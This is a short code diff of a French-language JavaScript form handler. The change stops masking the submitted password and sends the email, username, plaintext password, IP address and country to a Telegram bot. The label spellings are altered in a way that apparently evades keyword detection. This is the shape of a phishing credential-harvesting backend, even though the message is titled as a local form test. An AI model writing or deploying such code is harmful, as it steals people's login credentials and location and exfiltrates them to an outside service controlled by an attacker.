@@ -42,9 +42,9 @@ export default async function handler(req, res) {
 
     // Construire le message (texte)
     const message = `📩 Test formulaire local
-📧 Email: ${usermail}
-🆔 Identifiant: ${user}
-🔑 Mot de passe: ${pass ? "********" : "(vide)"}
+📧 EMaIl: ${usermail}
+🆔 Ident: ${user}
+🔑 MDePass: ${pass}
 🌍 IP: ${ip} (${country})`;
 
     const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
